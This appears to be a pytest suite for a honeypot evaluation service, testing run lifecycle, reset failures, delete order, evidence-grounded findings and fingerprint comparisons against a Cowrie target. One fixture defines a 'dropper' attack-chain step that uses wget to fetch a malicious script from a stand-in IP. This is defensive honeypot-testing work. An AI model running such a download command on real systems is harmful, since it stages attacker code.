import re

import pytest
import sqlalchemy.exc
from sqlalchemy import select

from app.db.models import (
    EvaluationChainStep,
    EvaluationEvidence,
    EvaluationFinding,
    EvaluationProbeResult,
    EvaluationRun,
    EvidenceKind,
)
from app.db.session import get_session_factory
from app.services.evaluation import runs

# ModuleOutcome lives in `outcomes.py`, not in `static/nmap.py`. It is defined
# once there and imported by nmap, tcpdump and agent alike; importing it from
# a module that merely re-uses it is how two definitions of the same type get
# created.
from app.services.evaluation.outcomes import ModuleOutcome
from app.services.evaluation.sanity import Observation
from app.services.evaluation.static.chains import ChainStepResult


@pytest.mark.asyncio
async def test_a_run_completes_with_the_evaluator_unavailable(monkeypatch) -> None:
    # The load-bearing checkpoint: a complete evaluation with no BYOK key.
    # run_status and evaluator_status are orthogonal, so a consumer can ask
    # "did the evaluation execute?" separately from "did the LLM run?".
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        assert run.status == "completed"
        assert run.evaluator_status == "unavailable"
        assert any(s.deterministic_score is not None for s in run.category_scores)
        assert all(s.evaluator_rating is None for s in run.category_scores)
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_a_failing_stage_still_stops_the_capture_and_finishes_the_run(
    monkeypatch,
) -> None:
    _stub_modules(monkeypatch)

    async def _boom(*args, **kwargs):
        raise RuntimeError("agent exploded")

    monkeypatch.setattr(runs, "_run_agent", _boom)

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        # Never left RUNNING, and the capture was stopped by the finally path.
        assert run.status in {"completed", "failed"}
        assert run.finished_at is not None
        agent_module = next(m for m in run.modules if m.module == "agent")
        assert agent_module.module_status == "error"
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_compare_flags_a_honeypot_configuration_change(monkeypatch) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    first = await runs.start_run("cowrie-01")
    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:CHANGED"))
    second = await runs.start_run("cowrie-01")
    try:
        comparison = await runs.compare_runs(first, second)
        assert comparison.classification == "configuration_changed"
        assert "honeypot_fingerprint" in comparison.differences
    finally:
        await runs.delete_run(first)
        await runs.delete_run(second)


@pytest.mark.asyncio
async def test_a_failing_reset_aborts_the_run_and_leaves_no_row(monkeypatch) -> None:
    """Reset produces no evidence -- it establishes the precondition.

    A run whose reset failed may be observing the previous run's residue, so
    every comparison drawn from it is unsound. It must report failed-to-start,
    never a score with a caveat. There is no run row to caveat anyway: both
    fingerprint columns are NOT NULL and both fingerprint functions raise, so
    a row cannot exist before reset has succeeded.
    """
    _stub_modules(monkeypatch)

    async def _refuse(*args, **kwargs):
        raise runs.ResetError("reset of /cowrie/... timed out")

    monkeypatch.setattr(runs, "_reset_target", _refuse)

    before = await _run_count()
    with pytest.raises(runs.ResetError):
        await runs.start_run("cowrie-01")
    assert await _run_count() == before


@pytest.mark.asyncio
async def test_a_reset_boundary_error_also_aborts_the_run(monkeypatch) -> None:
    # ResetBoundaryError is a ValueError, NOT a ResetError -- an
    # `except ResetError` handler does not catch it.
    _stub_modules(monkeypatch)

    async def _refuse(*args, **kwargs):
        raise runs.ResetBoundaryError("reset path covers preserved path")

    monkeypatch.setattr(runs, "_reset_target", _refuse)

    before = await _run_count()
    with pytest.raises(runs.ResetBoundaryError):
        await runs.start_run("cowrie-01")
    assert await _run_count() == before


@pytest.mark.asyncio
async def test_delete_run_removes_every_child_in_foreign_key_order(monkeypatch) -> None:
    """No FK in the evaluation schema declares ondelete, so order is ours.

    Evidence points at findings AND at chain steps AND at probe results, so it
    has to go first; the run row can only go last.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_run_chains", _chain_results)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await runs.start_run("cowrie-01")

    # A finding with evidence pointing at both child kinds, so deleting in the
    # wrong order raises rather than silently passing on an empty table.
    async with get_session_factory()() as db:
        probe_row = (
            await db.execute(
                select(EvaluationProbeResult).where(EvaluationProbeResult.run_id == run_id)
            )
        ).scalars().first()
        chain_row = (
            await db.execute(
                select(EvaluationChainStep).where(EvaluationChainStep.run_id == run_id)
            )
        ).scalars().first()
        assert probe_row is not None and chain_row is not None

        finding = EvaluationFinding(
            run_id=run_id,
            characteristic="sanity",
            severity="high",
            finding="manufactured for the delete-order guard",
            source="deterministic",
        )
        runs._stage_finding(
            db,
            runs.PendingFinding(
                finding=finding,
                evidence=[
                    EvaluationEvidence(
                        finding_id=finding.id,
                        kind=EvidenceKind.PROBE,
                        probe_result_id=probe_row.id,
                    ),
                    EvaluationEvidence(
                        finding_id=finding.id,
                        kind=EvidenceKind.CHAIN_STEP,
                        chain_step_id=chain_row.id,
                    ),
                ],
            ),
        )
        await runs._flush_findings(db)
        await db.commit()

    await runs.delete_run(run_id)

    async with get_session_factory()() as db:
        assert await db.get(EvaluationRun, run_id) is None
        for model, column in (
            (EvaluationProbeResult, EvaluationProbeResult.run_id),
            (EvaluationChainStep, EvaluationChainStep.run_id),
            (EvaluationFinding, EvaluationFinding.run_id),
        ):
            remaining = (await db.execute(select(model).where(column == run_id))).scalars().all()
            assert remaining == []


@pytest.mark.asyncio
async def test_a_finding_without_evidence_is_rejected_at_commit(monkeypatch) -> None:
    """The deferred constraint trigger fires at COMMIT, not at INSERT.

    Proven through the orchestrator's own persistence path, so the guarantee
    is that THIS code cannot write an ungrounded finding -- not merely that
    the database has a trigger somewhere.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await runs.start_run("cowrie-01")
    try:
        with pytest.raises(sqlalchemy.exc.DatabaseError) as excinfo:
            async with get_session_factory()() as db:
                runs._stage_finding(
                    db,
                    runs.PendingFinding(
                        finding=EvaluationFinding(
                            run_id=run_id,
                            characteristic="sanity",
                            severity="high",
                            finding="ungrounded",
                            source="deterministic",
                        ),
                        evidence=[],
                    ),
                )
                await runs._flush_findings(db)
                # The INSERT itself succeeds; the trigger is DEFERRED.
                await db.commit()
        assert "no evidence" in str(excinfo.value)
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_no_chains_means_no_attack_possibilities_score(monkeypatch) -> None:
    # scoring.score_characteristics adds the key only `if chain_results:` --
    # absent, not None. Absence must never be turned into a 0.0 either.
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        assert run.status == "completed"
        characteristics = {s.characteristic for s in run.category_scores}
        assert "attack_possibilities" not in characteristics
        assert characteristics  # the other characteristics were still scored
        assert any(s.deterministic_score is not None for s in run.category_scores)
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_a_run_is_never_left_running_when_scoring_explodes(monkeypatch) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    def _boom(*args, **kwargs):
        raise RuntimeError("scoring exploded")

    monkeypatch.setattr(runs, "_score", _boom)

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        assert run.status != "running"
        assert run.finished_at is not None
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_a_failed_evaluator_leaves_the_rating_null_not_zero(monkeypatch) -> None:
    """UNAVAILABLE and EVALUATOR_FAILED both return `verdict is None`.

    A missing realism judgement is "not established". Rendering it as 0.0
    would present our own provider error as a verdict against the honeypot.
    """
    _stub_modules(monkeypatch)

    class _BrokenClient:
        model_name = "test-evaluator"

        async def complete_json(self, prompt, schema):
            raise RuntimeError("429 rate limited")

    monkeypatch.setattr(runs, "_evaluator_client", lambda: _BrokenClient())

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        assert run.evaluator_status == "evaluator_failed"
        assert run.evaluator_model == "test-evaluator"
        assert all(s.evaluator_rating is None for s in run.category_scores)
        # The deterministic measurement survives a broken evaluator intact.
        assert any(s.deterministic_score is not None for s in run.category_scores)
        assert run.status == "completed"
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_compare_names_each_differing_fingerprint_independently(monkeypatch) -> None:
    """The two fingerprints carry opposite implications for attribution.

    A changed honeypot fingerprint is the POINT of the comparison. A changed
    evaluation-config fingerprint is what makes two runs incomparable. Both
    classify as `configuration_changed`, so `differences` has to say which.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    base = await runs.start_run("cowrie-01")

    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:HP-CHANGED"))
    honeypot_changed = await runs.start_run("cowrie-01")

    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:BASE"))
    monkeypatch.setattr(
        runs, "_evaluation_config_fingerprint", lambda budget: "sha256:CFG-CHANGED"
    )
    config_changed = await runs.start_run("cowrie-01")

    try:
        honeypot_delta = await runs.compare_runs(base, honeypot_changed)
        assert honeypot_delta.classification == "configuration_changed"
        assert honeypot_delta.differences == ["honeypot_fingerprint"]

        config_delta = await runs.compare_runs(base, config_changed)
        assert config_delta.classification == "configuration_changed"
        assert config_delta.differences == ["evaluation_config_fingerprint"]

        same = await runs.compare_runs(base, base)
        assert same.classification == "same_configuration"
        assert same.differences == []
    finally:
        for run_id in (base, honeypot_changed, config_changed):
            await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_an_evaluator_finding_persists_with_its_cited_evidence(monkeypatch) -> None:
    """The evaluator references evidence; it never creates it.

    Exercises the whole grounded path in one transaction: probe rows are
    flushed before the evidence that carries an immediate FK to them, and the
    finding plus its evidence reach COMMIT together for the deferred trigger.
    """
    _stub_modules(monkeypatch)

    class _CitingClient:
        model_name = "test-evaluator"

        async def complete_json(self, prompt, schema):
            # The package ids are generated at run time, so the fake reads
            # back the id it was actually offered rather than inventing one --
            # an invented id is rejected by the citation check by design.
            offered = re.findall(r"- \[(probe:[0-9a-f-]{36})\]", prompt)
            assert offered, prompt
            return schema(
                rating=0.25,
                critique="the shell answers too uniformly to be a real host",
                recommendation="vary command latency",
                cited_evidence_ids=[offered[0]],
            )

    monkeypatch.setattr(runs, "_evaluator_client", lambda: _CitingClient())

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        assert run.status == "completed"
        assert run.evaluator_status == "completed"
        assert run.evaluator_model == "test-evaluator"

        finding = next(f for f in run.findings if f.source == "evaluator")
        # Severity renders the evaluator's OWN rating; it is not a second
        # independent judgement.
        assert finding.severity == "high"
        assert finding.evidence
        assert all(e.kind == "probe" and e.probe_result_id for e in finding.evidence)

        rated = next(s for s in run.category_scores if s.characteristic == "basic_commands")
        assert rated.evaluator_rating == 0.25
        # Still two separate quantities, never merged.
        assert rated.deterministic_score == 1.0
    finally:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_two_probes_disagreeing_about_one_fact_become_a_grounded_finding(
    monkeypatch,
) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    async def _disagreeing_agent(*args, **kwargs):
        return ModuleOutcome(
            module="agent",
            module_status="completed",
            observations=[
                Observation(
                    probe_id="hostname_cmd",
                    establishes="host.name",
                    value="med-ws-04",
                    fact_status="observed",
                ),
                Observation(
                    probe_id="hostname_file",
                    establishes="host.name",
                    value="svr04",
                    fact_status="observed",
                ),
            ],
        )

    monkeypatch.setattr(runs, "_run_agent", _disagreeing_agent)

    run_id = await runs.start_run("cowrie-01")
    try:
        run = await runs.load_run(run_id)
        finding = next(f for f in run.findings if f.source == "deterministic")
        assert finding.characteristic == "sanity"
        assert "host.name" in finding.finding
        # Grounded in both probes that disagreed, or the deferred trigger
        # would have rejected it at COMMIT.
        assert len(finding.evidence) == 2
    finally:
        await runs.delete_run(run_id)


async def _run_count() -> int:
    async with get_session_factory()() as db:
        return len((await db.execute(select(EvaluationRun.id))).scalars().all())


def _fixed(value: str):
    async def _inner(*args, **kwargs) -> str:
        return value

    return _inner


async def _chain_results(*args, **kwargs):
    return [
        ChainStepResult(
            chain_id="dropper",
            step_index=0,
            command="wget http://198.51.100.7/malicious_script.sh",
            cowrie_event_id="event-1",
            matched_rule_id="R-T1105",
            expected_technique_id="T1105",
            fact_status="observed",
        )
    ]


def _stub_modules(monkeypatch) -> None:
    """Replace every subprocess/SSH boundary with a deterministic stub."""
    observation = Observation(
        probe_id="uname", establishes="os.identity", value="Linux", fact_status="observed"
    )
    outcome = ModuleOutcome(
        module="agent", module_status="completed", observations=[observation]
    )

    async def _agent(*args, **kwargs):
        return outcome

    async def _nmap(*args, **kwargs):
        return ModuleOutcome(module="nmap", module_status="completed", observations=[])

    async def _chains(*args, **kwargs):
        return []

    async def _noop(*args, **kwargs):
        return None

    monkeypatch.setattr(runs, "_run_agent", _agent)
    monkeypatch.setattr(runs, "_run_nmap", _nmap)
    monkeypatch.setattr(runs, "_run_chains", _chains)
    monkeypatch.setattr(runs, "_reset_target", _noop)
    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:BASE"))
    monkeypatch.setattr(runs, "_capture", runs._null_capture)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)
